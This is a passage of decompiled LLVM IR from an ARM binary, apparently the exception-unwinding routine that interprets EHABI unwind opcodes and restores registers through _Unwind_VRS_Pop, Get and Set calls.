  store i8 %v1_18f80, i8* %v4_18f80, align 1
  %v0_18f84 = load i32, i32* @r5, align 4
  %v1_18f84 = add i32 %v0_18f84, 4
  %v2_18f84 = inttoptr i32 %v1_18f84 to i32*
  %v3_18f84 = load i32, i32* %v2_18f84, align 4
  store i32 %v3_18f84, i32* %r2.global-to-local, align 4
  %v1_18f88 = inttoptr i32 %v3_18f84 to i32*
  %v2_18f88 = load i32, i32* %v1_18f88, align 4
  store i32 %v2_18f88, i32* %r0.global-to-local, align 4
  %v4_18f88 = add i32 %v3_18f84, 4
  store i32 %v4_18f88, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18f90 = inttoptr i32 %v0_18f84 to i32*
  store i32 %v2_18f88, i32* %v1_18f90, align 4
  %v5_18f90 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18f90, i32* %v2_18f84, align 4
  %v0_18f94 = load i32, i32* %r3.global-to-local, align 4
  %v1_18f94 = trunc i32 %v0_18f94 to i8
  %v2_18f94 = load i32, i32* @r5, align 4
  %v3_18f94 = add i32 %v2_18f94, 8
  %v4_18f94 = inttoptr i32 %v3_18f94 to i8*
  store i8 %v1_18f94, i8* %v4_18f94, align 1
  br label %dec_label_pc_18f98

dec_label_pc_18f98:                               ; preds = %.thread, %dec_label_pc_18f7c, %.thread6
  %v0_18f98 = load i32, i32* @r5, align 4
  %v1_18f98 = inttoptr i32 %v0_18f98 to i32*
  %v2_18f98 = load i32, i32* %v1_18f98, align 4
  %v3_18f9c = udiv i32 %v2_18f98, 16777216
  store i32 %v3_18f9c, i32* @r4, align 4
  store i32 %v3_18f9c, i32* %ip.global-to-local, align 4
  %v3_18fa4 = mul i32 %v2_18f98, 256
  store i32 %v3_18fa4, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_18f98, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_18fa4, i32* %v1_18f98, align 4
  br i1 %tmp183, label %dec_label_pc_19078, label %dec_label_pc_18fb4

dec_label_pc_18fb4:                               ; preds = %dec_label_pc_18f98
  %v0_18fb4 = load i32, i32* @r4, align 4
  %v1_18fb4 = and i32 %v0_18fb4, 128
  store i32 %v1_18fb4, i32* %r1.global-to-local, align 4
  %v2_18fb4 = icmp eq i32 %v1_18fb4, 0
  store i1 %v2_18fb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fb4, label %dec_label_pc_19090, label %dec_label_pc_18fbc

dec_label_pc_18fbc:                               ; preds = %dec_label_pc_18fb4
  %v1_18fbc = and i32 %v0_18fb4, 240
  store i32 %v1_18fbc, i32* @r6, align 4
  %v7_18fc0 = icmp eq i32 %v1_18fbc, 128
  store i1 %v7_18fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18fc0, label %dec_label_pc_18fc8, label %dec_label_pc_190ec

dec_label_pc_18fc8:                               ; preds = %dec_label_pc_18fbc
  %v0_18fc8 = load i32, i32* @r5, align 4
  %v1_18fc8 = add i32 %v0_18fc8, 8
  %v2_18fc8 = inttoptr i32 %v1_18fc8 to i8*
  %v3_18fc8 = load i8, i8* %v2_18fc8, align 1
  %v4_18fc8 = zext i8 %v3_18fc8 to i32
  store i32 %v4_18fc8, i32* %r3.global-to-local, align 4
  %v2_18fcc = icmp eq i8 %v3_18fc8, 0
  store i1 %v2_18fcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fcc, label %dec_label_pc_18fdc, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18fc8
  %v2_18fd0 = add nsw i32 %v4_18fc8, -1
  store i32 %v2_18fd0, i32* %r3.global-to-local, align 4
  %v2_18fd4 = trunc i32 %v2_18fd0 to i8
  store i8 %v2_18fd4, i8* %v2_18fc8, align 1
  %v0_18fd8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18fd8.pr.pr, label %.thread3.dec_label_pc_18fdc_crit_edge, label %dec_label_pc_1900c

.thread3.dec_label_pc_18fdc_crit_edge:            ; preds = %.thread3
  %v0_18fdc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18fdc

dec_label_pc_18fdc:                               ; preds = %.thread3.dec_label_pc_18fdc_crit_edge, %dec_label_pc_18fc8
  %v2_18ff0 = phi i32 [ %v0_18fdc.pre, %.thread3.dec_label_pc_18fdc_crit_edge ], [ %v0_18fc8, %dec_label_pc_18fc8 ]
  %v1_18fdc = add i32 %v2_18ff0, 9
  %v2_18fdc = inttoptr i32 %v1_18fdc to i8*
  %v3_18fdc = load i8, i8* %v2_18fdc, align 1
  %v4_18fdc = zext i8 %v3_18fdc to i32
  store i32 %v4_18fdc, i32* %r3.global-to-local, align 4
  %v2_18fe0 = icmp eq i8 %v3_18fdc, 0
  store i1 %v2_18fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fe0, label %dec_label_pc_1901c, label %dec_label_pc_18fec

dec_label_pc_18fec:                               ; preds = %dec_label_pc_18fdc
  %v1_18fec = add nsw i32 %v4_18fdc, -1
  store i32 %v1_18fec, i32* %r3.global-to-local, align 4
  %v1_18ff0 = trunc i32 %v1_18fec to i8
  store i8 %v1_18ff0, i8* %v2_18fdc, align 1
  %v0_18ff4 = load i32, i32* @r5, align 4
  %v1_18ff4 = add i32 %v0_18ff4, 4
  %v2_18ff4 = inttoptr i32 %v1_18ff4 to i32*
  %v3_18ff4 = load i32, i32* %v2_18ff4, align 4
  store i32 %v3_18ff4, i32* %r2.global-to-local, align 4
  %v1_18ff8 = inttoptr i32 %v3_18ff4 to i32*
  %v2_18ff8 = load i32, i32* %v1_18ff8, align 4
  store i32 %v2_18ff8, i32* %r0.global-to-local, align 4
  %v4_18ff8 = add i32 %v3_18ff4, 4
  store i32 %v4_18ff8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18ff8, i32* %v2_18ff4, align 4
  %v0_19004 = load i32, i32* %r3.global-to-local, align 4
  %v1_19004 = trunc i32 %v0_19004 to i8
  %v2_19004 = load i32, i32* @r5, align 4
  %v3_19004 = add i32 %v2_19004, 8
  %v4_19004 = inttoptr i32 %v3_19004 to i8*
  store i8 %v1_19004, i8* %v4_19004, align 1
  %v0_19008 = load i32, i32* %r0.global-to-local, align 4
  %v1_19008 = load i32, i32* @r5, align 4
  %v2_19008 = inttoptr i32 %v1_19008 to i32*
  store i32 %v0_19008, i32* %v2_19008, align 4
  br label %dec_label_pc_1900c

dec_label_pc_1900c:                               ; preds = %.thread3, %dec_label_pc_18fec
  %v0_1900c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1900c, i32* %r3.global-to-local, align 4
  %v3_19010 = mul i32 %v0_1900c, 256
  store i32 %v3_19010, i32* %r0.global-to-local, align 4
  %v1_19014 = load i32, i32* @r5, align 4
  %v2_19014 = inttoptr i32 %v1_19014 to i32*
  store i32 %v3_19010, i32* %v2_19014, align 4
  %v0_19018 = load i32, i32* %r3.global-to-local, align 4
  %v3_19018 = udiv i32 %v0_19018, 16777216
  br label %dec_label_pc_1901c

dec_label_pc_1901c:                               ; preds = %dec_label_pc_18fdc, %dec_label_pc_1900c
  %storemerge133 = phi i32 [ %v3_19018, %dec_label_pc_1900c ], [ 176, %dec_label_pc_18fdc ]
  %v1_1901c = load i32, i32* %ip.global-to-local, align 4
  %v4_1901c = mul i32 %v1_1901c, 256
  %v5_1901c = or i32 %v4_1901c, %storemerge133
  store i32 %v5_1901c, i32* %r2.global-to-local, align 4
  %v7_19020 = icmp eq i32 %v5_1901c, 32768
  store i1 %v7_19020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19020, label %dec_label_pc_1922c, label %dec_label_pc_19028

dec_label_pc_19028:                               ; preds = %dec_label_pc_1901c
  %v3_19028 = mul i32 %v5_1901c, 16
  store i32 %v3_19028, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_19038 = and i32 %v3_19028, 65520
  store i32 %v3_19038, i32* %r2.global-to-local, align 4
  %v0_1903c = load i32, i32* @r7, align 4
  store i32 %v0_1903c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_19044 = call i32 @_Unwind_VRS_Pop(i32 %v0_1903c, i32 %v3_19038, i32 0, i32 0)
  store i32 %v4_19044, i32* %r0.global-to-local, align 4
  %v2_19048 = icmp eq i32 %v4_19044, 0
  store i1 %v2_19048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19048, label %dec_label_pc_19050, label %dec_label_pc_1922c

dec_label_pc_19050:                               ; preds = %dec_label_pc_19028
  %v0_19050 = load i32, i32* @r5, align 4
  %v1_19050 = add i32 %v0_19050, 8
  %v2_19050 = inttoptr i32 %v1_19050 to i8*
  %v3_19050 = load i8, i8* %v2_19050, align 1
  %v4_19050 = zext i8 %v3_19050 to i32
  store i32 %v4_19050, i32* %r3.global-to-local, align 4
  %v0_19054 = load i32, i32* @r4, align 4
  %v1_19054 = and i32 %v0_19054, 32768
  %v2_19054 = icmp eq i32 %v1_19054, 0
  store i1 %v2_19054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19054, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_19050
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_19050, %bb147
  %v2_1905c = icmp eq i8 %v3_19050, 0
  store i1 %v2_1905c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1905c, label %dec_label_pc_1906c, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_19060 = add nsw i32 %v4_19050, -1
  store i32 %v2_19060, i32* %r3.global-to-local, align 4
  %v2_19064 = trunc i32 %v2_19060 to i8
  store i8 %v2_19064, i8* %v2_19050, align 1
  %v0_19068.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19068.pr.pr, label %.thread6.dec_label_pc_1906c_crit_edge, label %dec_label_pc_18f98

.thread6.dec_label_pc_1906c_crit_edge:            ; preds = %.thread6
  %v0_1906c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1906c

dec_label_pc_1906c:                               ; preds = %bb148, %.thread6.dec_label_pc_1906c_crit_edge
  %v0_1906c = phi i32 [ %v0_1906c.pre, %.thread6.dec_label_pc_1906c_crit_edge ], [ %v0_19050, %bb148 ]
  %v1_1906c = add i32 %v0_1906c, 9
  %v2_1906c = inttoptr i32 %v1_1906c to i8*
  %v3_1906c = load i8, i8* %v2_1906c, align 1
  %v4_1906c = zext i8 %v3_1906c to i32
  store i32 %v4_1906c, i32* %r3.global-to-local, align 4
  %v2_19070 = icmp eq i8 %v3_1906c, 0
  store i1 %v2_19070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19070, label %dec_label_pc_19078, label %dec_label_pc_18f7c

dec_label_pc_19078:                               ; preds = %dec_label_pc_1906c, %dec_label_pc_18f70, %dec_label_pc_18f98
  %v0_19078 = load i32, i32* @sl, align 4
  %v2_19078 = icmp eq i32 %v0_19078, 0
  store i1 %v2_19078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19078, label %dec_label_pc_19140, label %bb149

bb149:                                            ; preds = %dec_label_pc_19078
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19084

dec_label_pc_19084:                               ; preds = %bb149, %dec_label_pc_195f4, %dec_label_pc_19494, %dec_label_pc_192b8, %dec_label_pc_19270, %dec_label_pc_1922c, %dec_label_pc_19140
  %v1_1908c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_195f4 ], [ 9, %dec_label_pc_19494 ], [ 9, %dec_label_pc_192b8 ], [ 9, %dec_label_pc_19270 ], [ 9, %dec_label_pc_1922c ], [ %v0_19174, %dec_label_pc_19140 ]
  store i32 %v9_18f48, i32* %r6.global-to-local, align 4
  store i32 %v21_18f48, i32* @lr, align 4
  ret i32 %v1_1908c

dec_label_pc_19090:                               ; preds = %dec_label_pc_18fb4
  %v1_19090 = mul i32 %v0_18fb4, 4
  %v3_19094 = and i32 %v1_19090, 252
  store i32 %v3_19094, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_190a0 = load i32, i32* @r7, align 4
  store i32 %v0_190a0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_190a8 = add nuw nsw i32 %v3_19094, 4
  store i32 %v1_190a8, i32* %r6.global-to-local, align 4
  %v5_190b0 = call i32 @_Unwind_VRS_Get(i32 %v0_190a0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_190b4 = load i32, i32* @r4, align 4
  %v1_190b4 = and i32 %v0_190b4, 64
  %v2_190b4 = icmp eq i32 %v1_190b4, 0
  store i1 %v2_190b4, i1* %cpsr_z.global-to-local, align 1
  %v4_190bc = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_190c8 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_190c8
  %storemerge160.p = select i1 %v2_190b4, i32 %v2_190c8, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_190bc
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_190e4 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_190e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f5c.backedge

dec_label_pc_18f5c.backedge:                      ; preds = %dec_label_pc_19090, %dec_label_pc_1910c, %dec_label_pc_19590, %dec_label_pc_1925c, %dec_label_pc_19294, %dec_label_pc_19214, %dec_label_pc_19480
  %v0_18f5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18f5c

dec_label_pc_190ec:                               ; preds = %dec_label_pc_18fbc
  %v7_190ec = icmp eq i32 %v1_18fbc, 144
  store i1 %v7_190ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_190ec, label %dec_label_pc_190f4, label %dec_label_pc_19234

dec_label_pc_190f4:                               ; preds = %dec_label_pc_190ec
  %v1_190f4 = urem i32 %v0_18fb4, 16
  store i32 %v1_190f4, i32* %r2.global-to-local, align 4
  %v2_190f8 = icmp eq i32 %v1_190f4, 15
  store i1 %v2_190f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190f8, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_190f4
  %v8_190fc = icmp eq i32 %v1_190f4, 13
  store i1 %v8_190fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_190fc, label %bb154, label %dec_label_pc_1910c

.thread21:                                        ; preds = %dec_label_pc_190f4
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1922c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1922c

dec_label_pc_1910c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19118 = load i32, i32* @r7, align 4
  store i32 %v0_19118, i32* %r0.global-to-local, align 4
  %v5_19120 = call i32 @_Unwind_VRS_Get(i32 %v0_19118, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19128 = load i32, i32* @r7, align 4
  store i32 %v0_19128, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_19138 = call i32 @_Unwind_VRS_Set(i32 %v0_19128, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19138, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f5c.backedge

dec_label_pc_19140:                               ; preds = %dec_label_pc_19078
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19150 = load i32, i32* @r7, align 4
  store i32 %v0_19150, i32* %r0.global-to-local, align 4
  %v7_19158 = call i32 @_Unwind_VRS_Get(i32 %v0_19150, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1915c = load i32, i32* @r7, align 4
  store i32 %v0_1915c, i32* %r0.global-to-local, align 4
  %v0_19160 = load i32, i32* @sl, align 4
  store i32 %v0_19160, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_19160, i32* %r3.global-to-local, align 4
  %v5_19170 = call i32 @_Unwind_VRS_Set(i32 %v0_1915c, i32 %v0_19160, i32 15, i32 %v0_19160, i8* bitcast (i32* @0 to i8*))
  %v0_19174 = load i32, i32* @sl, align 4
  store i32 %v0_19174, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19084

dec_label_pc_1917c:                               ; preds = %dec_label_pc_19370
  %v7_1917c = icmp eq i32 %v0_19370, 199
  store i1 %v7_1917c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1917c, label %dec_label_pc_19450, label %dec_label_pc_19184

dec_label_pc_19184:                               ; preds = %dec_label_pc_1917c
  %v1_19184 = and i32 %v0_18fb4, 248
  store i32 %v1_19184, i32* %r3.global-to-local, align 4
  %v7_19188 = icmp eq i32 %v1_19184, 192
  store i1 %v7_19188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19188, label %.thread24, label %dec_label_pc_191a0

.thread24:                                        ; preds = %dec_label_pc_19184
  %v2_1918c = urem i32 %v0_18fb4, 16
  %v2_19190 = add nuw nsw i32 %v2_1918c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_19198 = or i32 %v2_19190, 655360
  store i32 %v2_19198, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1925c

dec_label_pc_191a0:                               ; preds = %dec_label_pc_19184
  %v7_191a0 = icmp eq i32 %v0_19370, 200
  store i1 %v7_191a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_191a0, label %dec_label_pc_193e4, label %dec_label_pc_191a8

dec_label_pc_191a8:                               ; preds = %dec_label_pc_191a0
  %v7_191a8 = icmp eq i32 %v0_19370, 201
  store i1 %v7_191a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_191a8, label %dec_label_pc_191b0, label %dec_label_pc_1922c

dec_label_pc_191b0:                               ; preds = %dec_label_pc_191a8
  %v0_191b0 = load i32, i32* @r5, align 4
  %v1_191b0 = add i32 %v0_191b0, 8
  %v2_191b0 = inttoptr i32 %v1_191b0 to i8*
  %v3_191b0 = load i8, i8* %v2_191b0, align 1
  %v4_191b0 = zext i8 %v3_191b0 to i32
  store i32 %v4_191b0, i32* %r3.global-to-local, align 4
  %v2_191b4 = icmp eq i8 %v3_191b0, 0
  store i1 %v2_191b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_191b4, label %dec_label_pc_191c4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_191b0
  %v2_191b8 = add nsw i32 %v4_191b0, -1
  store i32 %v2_191b8, i32* %r3.global-to-local, align 4
  %v2_191bc = trunc i32 %v2_191b8 to i8
  store i8 %v2_191bc, i8* %v2_191b0, align 1
  %v0_191c0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_191c0.pr.pr, label %.thread26.dec_label_pc_191c4_crit_edge, label %dec_label_pc_191f8

.thread26.dec_label_pc_191c4_crit_edge:           ; preds = %.thread26
  %v0_191c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_191c4

dec_label_pc_191c4:                               ; preds = %.thread26.dec_label_pc_191c4_crit_edge, %dec_label_pc_191b0
  %v2_191dc = phi i32 [ %v0_191c4.pre, %.thread26.dec_label_pc_191c4_crit_edge ], [ %v0_191b0, %dec_label_pc_191b0 ]
  %v1_191c4 = add i32 %v2_191dc, 9
  %v2_191c4 = inttoptr i32 %v1_191c4 to i8*
  %v3_191c4 = load i8, i8* %v2_191c4, align 1
  %v4_191c4 = zext i8 %v3_191c4 to i32
  store i32 %v4_191c4, i32* %r3.global-to-local, align 4
  %v2_191c8 = icmp eq i8 %v3_191c4, 0
  store i1 %v2_191c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_191c8, label %dec_label_pc_19214, label %dec_label_pc_191d8

dec_label_pc_191d8:                               ; preds = %dec_label_pc_191c4
  %v1_191d8 = add nsw i32 %v4_191c4, -1
  store i32 %v1_191d8, i32* %r3.global-to-local, align 4
  %v1_191dc = trunc i32 %v1_191d8 to i8
  store i8 %v1_191dc, i8* %v2_191c4, align 1
  %v0_191e0 = load i32, i32* @r5, align 4
  %v1_191e0 = add i32 %v0_191e0, 4
  %v2_191e0 = inttoptr i32 %v1_191e0 to i32*
  %v3_191e0 = load i32, i32* %v2_191e0, align 4
  store i32 %v3_191e0, i32* %r2.global-to-local, align 4
  %v1_191e4 = inttoptr i32 %v3_191e0 to i32*
  %v2_191e4 = load i32, i32* %v1_191e4, align 4
  store i32 %v2_191e4, i32* %r0.global-to-local, align 4
  %v4_191e4 = add i32 %v3_191e0, 4
  store i32 %v4_191e4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_191e4, i32* %v2_191e0, align 4
  %v0_191f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_191f0 = trunc i32 %v0_191f0 to i8
  %v2_191f0 = load i32, i32* @r5, align 4
  %v3_191f0 = add i32 %v2_191f0, 8
  %v4_191f0 = inttoptr i32 %v3_191f0 to i8*
  store i8 %v1_191f0, i8* %v4_191f0, align 1
  %v0_191f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_191f4 = load i32, i32* @r5, align 4
  %v2_191f4 = inttoptr i32 %v1_191f4 to i32*
  store i32 %v0_191f4, i32* %v2_191f4, align 4
  br label %dec_label_pc_191f8

dec_label_pc_191f8:                               ; preds = %.thread26, %dec_label_pc_191d8
  %v0_191f8 = load i32, i32* %r0.global-to-local, align 4
  %v3_191f8 = udiv i32 %v0_191f8, 16777216
  %v1_191fc = urem i32 %v3_191f8, 16
  %v3_19200 = mul i32 %v0_191f8, 256
  %v1_19204 = add nuw nsw i32 %v1_191fc, 1
  store i32 %v1_19204, i32* %r1.global-to-local, align 4
  %v1_19208 = and i32 %v3_191f8, 240
  store i32 %v1_19208, i32* %r3.global-to-local, align 4
  %v1_1920c = load i32, i32* @r5, align 4
  %v2_1920c = inttoptr i32 %v1_1920c to i32*
  store i32 %v3_19200, i32* %v2_1920c, align 4
  %v0_19210 = load i32, i32* %r1.global-to-local, align 4
  %v1_19210 = load i32, i32* %r3.global-to-local, align 4
  %v4_19210 = mul i32 %v1_19210, 4096
  %v5_19210 = or i32 %v4_19210, %v0_19210
  br label %dec_label_pc_19214

dec_label_pc_19214:                               ; preds = %dec_label_pc_191c4, %dec_label_pc_191f8
  %storemerge = phi i32 [ %v5_19210, %dec_label_pc_191f8 ], [ 720897, %dec_label_pc_191c4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_19214 = load i32, i32* @r7, align 4
  store i32 %v0_19214, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_19220 = call i32 @_Unwind_VRS_Pop(i32 %v0_19214, i32 1, i32 5, i32 5)
  store i32 %v4_19220, i32* %r0.global-to-local, align 4
  %v2_19224 = icmp eq i32 %v4_19220, 0
  store i1 %v2_19224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19224, label %dec_label_pc_18f5c.backedge, label %dec_label_pc_1922c

dec_label_pc_1922c:                               ; preds = %dec_label_pc_19478, %dec_label_pc_191a8, %dec_label_pc_19288, %dec_label_pc_1962c, %dec_label_pc_195fc, %dec_label_pc_195d8, %dec_label_pc_19464, %dec_label_pc_19214, %dec_label_pc_19028, %dec_label_pc_1901c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19084

dec_label_pc_19234:                               ; preds = %dec_label_pc_190ec
  %v7_19234 = icmp eq i32 %v1_18fbc, 160
  store i1 %v7_19234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19234, label %dec_label_pc_1923c, label %dec_label_pc_19278

dec_label_pc_1923c:                               ; preds = %dec_label_pc_19234
  %v0_1923c = load i32, i32* %ip.global-to-local, align 4
  %v1_1923c = urem i32 %v0_1923c, 8
  %v1_19240 = xor i32 %v1_1923c, 7
  store i32 %v1_19240, i32* %r3.global-to-local, align 4
  %v6_19248 = lshr i32 4080, %v1_19240
  %v1_1924c = and i32 %v0_18fb4, 8
  %v2_1924c = icmp eq i32 %v1_1924c, 0
  store i1 %v2_1924c, i1* %cpsr_z.global-to-local, align 1
  %v1_19250 = and i32 %v6_19248, 4080
  %tmp155 = mul nuw nsw i32 %v1_1924c, 2048
  %tmp156 = or i32 %v1_19250, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1925c

dec_label_pc_1925c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_195ec.dec_label_pc_1925c_crit_edge, %bb157, %dec_label_pc_19448, %dec_label_pc_193dc, %dec_label_pc_1933c, %dec_label_pc_1923c
  %v2_19264 = phi i32 [ %v2_19360, %.thread44 ], [ %v2_19368, %bb157 ], [ %v2_19264.pre, %dec_label_pc_195ec.dec_label_pc_1925c_crit_edge ], [ %v2_19198, %.thread24 ], [ %storemerge130, %dec_label_pc_19448 ], [ %storemerge131, %dec_label_pc_193dc ], [ %storemerge132, %dec_label_pc_1933c ], [ %tmp156, %dec_label_pc_1923c ]
  %v0_19260 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_195ec.dec_label_pc_1925c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_19448 ], [ 3, %dec_label_pc_193dc ], [ 1, %dec_label_pc_1933c ], [ 0, %dec_label_pc_1923c ]
  %v0_1925c = load i32, i32* @r7, align 4
  store i32 %v0_1925c, i32* %r0.global-to-local, align 4
  store i32 %v0_19260, i32* %r3.global-to-local, align 4
  %v4_19264 = call i32 @_Unwind_VRS_Pop(i32 %v0_1925c, i32 %v0_19260, i32 %v2_19264, i32 %v0_19260)
  store i32 %v4_19264, i32* %r0.global-to-local, align 4
  %v2_19268 = icmp eq i32 %v4_19264, 0
  store i1 %v2_19268, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19268, label %dec_label_pc_18f5c.backedge, label %dec_label_pc_19270

dec_label_pc_19270:                               ; preds = %dec_label_pc_1925c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19084

dec_label_pc_19278:                               ; preds = %dec_label_pc_19234
  %v7_19278 = icmp eq i32 %v1_18fbc, 176
  store i1 %v7_19278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19278, label %dec_label_pc_192c0, label %dec_label_pc_19280

dec_label_pc_19280:                               ; preds = %dec_label_pc_19278
  %v7_19280 = icmp eq i32 %v1_18fbc, 192
  store i1 %v7_19280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19280, label %dec_label_pc_19370, label %dec_label_pc_19288

dec_label_pc_19288:                               ; preds = %dec_label_pc_19280
  %v1_19288 = and i32 %v0_18fb4, 248
  store i32 %v1_19288, i32* %r3.global-to-local, align 4
  %v7_1928c = icmp eq i32 %v1_19288, 208
  store i1 %v7_1928c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1928c, label %dec_label_pc_19294, label %dec_label_pc_1922c

dec_label_pc_19294:                               ; preds = %dec_label_pc_19288
  %v1_19294 = urem i32 %v0_18fb4, 8
  %v1_19298 = add nuw nsw i32 %v1_19294, 1
  %v1_1929c = or i32 %v1_19298, 524288
  store i32 %v1_1929c, i32* %r2.global-to-local, align 4
  %v0_192a0 = load i32, i32* @r7, align 4
  store i32 %v0_192a0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_192ac = call i32 @_Unwind_VRS_Pop(i32 %v0_192a0, i32 1, i32 %v1_1929c, i32 5)
  store i32 %v4_192ac, i32* %r0.global-to-local, align 4
  %v2_192b0 = icmp eq i32 %v4_192ac, 0
  store i1 %v2_192b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192b0, label %dec_label_pc_18f5c.backedge, label %dec_label_pc_192b8

dec_label_pc_192b8:                               ; preds = %dec_label_pc_19294
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19084

dec_label_pc_192c0:                               ; preds = %dec_label_pc_19278
  %v0_192c0 = load i32, i32* %ip.global-to-local, align 4
  %v7_192c0 = icmp eq i32 %v0_192c0, 177
  store i1 %v7_192c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_192c0, label %dec_label_pc_195c4, label %dec_label_pc_192c8

dec_label_pc_192c8:                               ; preds = %dec_label_pc_192c0
  %v7_192c8 = icmp eq i32 %v0_192c0, 178
  store i1 %v7_192c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_192c8, label %dec_label_pc_1949c, label %dec_label_pc_192d0

dec_label_pc_192d0:                               ; preds = %dec_label_pc_192c8
  %v7_192d0 = icmp eq i32 %v0_192c0, 179
